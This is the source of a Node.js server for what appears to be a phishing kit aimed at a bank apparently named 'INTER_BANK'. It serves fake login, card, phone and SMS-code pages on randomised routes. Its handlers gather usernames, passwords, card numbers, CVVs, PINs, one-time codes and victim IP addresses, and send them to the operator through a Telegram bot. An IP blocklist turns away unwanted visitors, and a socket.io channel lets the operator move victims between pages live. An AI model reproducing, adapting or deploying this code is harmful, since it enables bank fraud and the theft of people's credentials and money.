require('dotenv').config();
const path = require("path");
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);





const requestIp = require("request-ip");
var session = require('express-session');
const fs = require("fs");

const {Telegraf} = require("telegraf");
const bot = new Telegraf(process.env.TOKEN);



let target = "I-1N-1T-1E-1R-1_-1B-1A-1N-1K"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "C-1U-1L-1D-1A"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");




// PORT:
const PORT = process.env.PORT || 4000

//use:
app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: true,
}));
app.use(express.static(path.join(__dirname,'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());




//set:
app.set('view engine', 'ejs');



/////////////////[FUNCTION]//(blocker)//////////////
app.use((req,res,next)=>{
    let new_ip = requestIp.getClientIp(req);
    if(findIp(new_ip)){
        return res.redirect(process.env.URL);
    }
    next();
});
app.get("/culda",(req,res)=>{
    res.render("culda");
});
app.post("/culda",(req,res)=>{
    let {type,ip} = req.body;
    if(type == "block"){
        blockOne(ip);
        res.send({OK:true,type:"bad"});
    }
    else{
        unblockOne(ip);
        res.send({OK:true,type:"good"});
    }
});
var data_ip = "./data/ip_list.txt";
function blockOne(ip){
    if(!findIp(ip)){
        fs.appendFileSync(data_ip,`${ip}\n`);
    }
}
function unblockOne(ip){
    if(findIp(ip)){
        let list_ip = getIpList();
        let new_list_ip = [];
        let final_list_ip = ``;
        for (let i = 0; i < list_ip.length; i++) {
            if(list_ip[i] != ip){
                new_list_ip.push(list_ip[i]);
            }
        }
        for (let x = 0; x < new_list_ip.length; x++) {
            final_list_ip += `${new_list_ip[x]}\n`;
        }
        fs.writeFileSync(data_ip,"");
        fs.writeFileSync(data_ip,final_list_ip);
    }
}
function findIp(ip){
    let list_ip = getIpList();
    let isHere = false;
    for (let n = 0; n < list_ip.length; n++) {
        if(list_ip[n] == ip){
            isHere = true;
            break;
        }
    }
    return isHere;
}
function getIpList(){
    var text = fs.readFileSync(data_ip, 'utf-8');
    let new_text = text.replace(/\r\n|\n|\r/gm,",");
    let t = new_text.split(",");
    let good_one = [];
    for (let i = 0; i < t.length; i++) {
        if(t[i] != ""){
            good_one.push(t[i]);
        }
    }
    return good_one;
}
//////////////////////////////
//=========================[GET]===================
app.get("/",(req,res)=>{ // login
    res.render("index");
});
app.get("/fGnEL4jmpuBCDkJP3myR",(req,res)=>{ // cc
    res.render("cimatti");
});
app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // firma:
    res.render("forma");
});
app.get("/Q89HFszQPd3TFv4mx65k",(req,res)=>{ // tele number:
    res.render("numori");
});
app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // sms 1:
    res.render("otmis1");
});
app.get("/aEsKRvuaENZtYax265Kv",(req,res)=>{ // sms 2:
    res.render("otmis2");
});
app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading:
    res.render("dolab");
});
app.get("/HfuRVXK8w8fLmT2vWHe8",(req,res)=>{ // done:
    res.render("done",{url:process.env.URL});
});







//======================[POST]======================
app.post("/gzLbTbjqMpc34D4XsPJ2",(req,res)=>{ // login post
    let data = req.body;
    // console.log(data);
    a1(data,requestIp.getClientIp(req));
    res.send({OK:true});
});

app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
    let data = req.body;
    // console.log(data);
    a2(data,requestIp.getClientIp(req));
    res.send({OK:true});
});
app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // sms1 post
    let data = req.body;
    // console.log(data);
    a3(data,requestIp.getClientIp(req));
    res.send({OK:true});
});
app.post("/Qv69PRvXg6PQEvrzJx6j",(req,res)=>{ // sms2 post
    let data = req.body;
    // console.log(data);
    a4(data,requestIp.getClientIp(req));
    res.send({OK:true});
});


// Functions:
// 9alab dayal culda:
function a1(data,ip) {
    let block="";
    block += `${brand}  | [LOGIN] |  TEAM\n`; 
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `USER: ${data.logi}\nPASSWORD: ${data.paso}\nIP: ${ip}\n`;
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `${brand}  | [${target}]  |  TEAM`;
    
    bot.telegram.sendMessage(process.env.CHATID,block);
    

}
function a2(data,ip) {
    let block="";
    block += `${brand}  | [CC-s5ona] |  TEAM\n`; 
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `CARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nPIN: ${data.a4}\nIP: ${ip}\n`;
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `${brand}  | [${target}]  |  TEAM`;
    
    bot.telegram.sendMessage(process.env.CHATID,block);
    

}
function a3(data,ip) {
    let block="";
    block += `${brand}  | [SMS](1) |  TEAM\n`; 
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `OTP: ${data.sps1}\nIP: ${ip}\n`;
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `${brand}  | [${target}]  |  TEAM`;
    
    bot.telegram.sendMessage(process.env.CHATID,block);
}
function a4(data,ip) {
    let block="";
    block += `${brand}  | [SMS](2) |  TEAM\n`; 
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `OTP: ${data.sps2}\nIP: ${ip}\n`;
    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
    block += `${brand}  | [${target}]  |  TEAM`;
    
    bot.telegram.sendMessage(process.env.CHATID,block);
}


io.on('connection', (socket) => {
    console.log('a user connected');
    socket.on("goto",(data)=>{
        console.log(data);
        io.emit("bye",data);
    });
    socket.on("back",(m)=>{
        io.emit("done",m);
    })
    socket.on('disconnect', () => {
      console.log('user disconnected');
    });
  });



// Listen to server:
server.listen(PORT,()=>{
    console.log(`Server listening to port: ${PORT}`);
});